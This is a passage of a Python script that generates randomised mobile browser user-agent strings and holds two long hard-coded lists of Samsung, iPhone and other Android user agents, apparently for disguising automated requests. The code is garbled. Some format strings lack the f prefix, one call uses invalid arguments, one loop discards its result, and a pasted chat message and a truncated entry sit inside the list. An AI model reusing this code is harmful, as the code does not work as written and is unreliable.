    A7A4  = "Mozilla/5.0 (Android; Android {str(rr(7,12))}; HUAWEI G{str(rr(2,12))}-L{str(rr(3,12))} Build/HuaweiG{str(rr(7,12))}-L{str(rr(7,12))}) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(2111,4999))}.{str(rr(73,299))} Mobile Safari/533.9"
    A7A5  = "Mozilla/5.0 (Linux; U; Android {str(rr(3,12))}; Samsung Galaxy S4 Mega GT-{str(rr(I4400,I9400))} Build/JDQ{str(rr(21,112))}) AppleWebKit/537.24 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,199))} Mobile Safari/534.0"
    A7A6  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,12))}_{str(rr(3,8))}_0 like Mac OS X) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,399))} Mobile Safari/536.3"
    A7A7  = f"Mozilla/5.0 (Android; Android{str(rr(4,12))}; MOTOROLA MOTO XT{str(rr(1300,1580))} Build/LXB{str(rr(10,25))}) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/537.36"
    A7A8  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,16))}_{str(rr(4,22))}_{str(rr(4,12))} like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/534.6"
    UserAgentss = str(rc([A7A,A7A1,A7A2,A7A3,A7A4,A7A5,A7A6,A7A7,A7A8]))
    ugen.append(UserAgentss)
for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'        
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen2.append(uaku)


        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for x in range(10):
        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b=random.randrange(100, 9999)
        c=random.randrange(100, 9999)
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        h=random.randrange(1, 9)
        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j=random.randrange(1, 9)
        k=random.randrange(1, 9)
        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

ua =['Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_4; like Mac OS X) AppleWebKit/536.15 (KHTML, like Gecko) Chrome/48.0.2062.163 Mobile Safari/536.1','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_4; like Mac OS X) AppleWebKit/533.16 (KHTML, like Gecko) Chrome/52.0.3179.371 Mobile Safari/535.3','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_0; like Mac OS X) AppleWebKit/533.22 (KHTML, like Gecko) Chrome/55.0.3907.124 Mobile Safari/534.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_3; like Mac OS X) AppleWebKit/533.9 (KHTML, like Gecko) Chrome/47.0.3197.251 Mobile Safari/533.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_6; like Mac OS X) AppleWebKit/533.31 (KHTML, like Gecko) Chrome/48.0.2288.159 Mobile Safari/534.5','Mozilla/5.0 (iPhone; CPU iPhone OS 7_8_5; like Mac OS X) AppleWebKit/535.44 (KHTML, like Gecko) Chrome/49.0.2005.384 Mobile Safari/601.0','Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_9; like Mac OS X) AppleWebKit/601.9 (KHTML, like Gecko) Chrome/48.0.1729.327 Mobile Safari/537.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_0; like Mac OS X) AppleWebKit/533.37 (KHTML, like Gecko) Chrome/51.0.3479.245 Mobile Safari/600.2','Mozilla/5.0 (iPhone; CPU iPhone OS 10_6_0; like Mac OS X) AppleWebKit/602.23 (KHTML, like Gecko) Chrome/51.0.2612.331 Mobile Safari/602.2','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_7; like Mac OS X) AppleWebKit/603.41 (KHTML, like Gecko) Chrome/54.0.2764.219 Mobile Safari/602.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/600.1 (KHTML, like Gecko) Chrome/55.0.1509.198 Mobile Safari/535.1','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_8; like Mac OS X) AppleWebKit/536.30 (KHTML, like Gecko) Chrome/52.0.2645.341 Mobile Safari/600.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_7_6; like Mac OS X) AppleWebKit/534.5 (KHTML, like Gecko) Chrome/50.0.2631.200 Mobile Safari/537.7','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_4; like Mac OS X) AppleWebKit/537.3 (KHTML, like Gecko) Chrome/49.0.2293.121 Mobile Safari/533.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_9; like Mac OS X) AppleWebKit/600.19 (KHTML, like Gecko) Chrome/53.0.1993.114 Mobile Safari/602.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_9; like Mac OS X) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/49.0.1575.360 Mobile Safari/603.1','Mozilla/5.0 (iPhone; CPU iPhone OS 10_8_6; like Mac OS X) AppleWebKit/602.33 (KHTML, like Gecko) Chrome/51.0.1977.203 Mobile Safari/537.5','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2; like Mac OS X) AppleWebKit/603.33 (KHTML, like Gecko) Chrome/53.0.2717.280 Mobile Safari/537.8','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_7; like Mac OS X) AppleWebKit/533.47 (KHTML, like Gecko) Chrome/55.0.1760.132 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_5; like Mac OS X) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/48.0.1101.271 Mobile Safari/536.7']
ua = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16 ,Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16 ,Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like 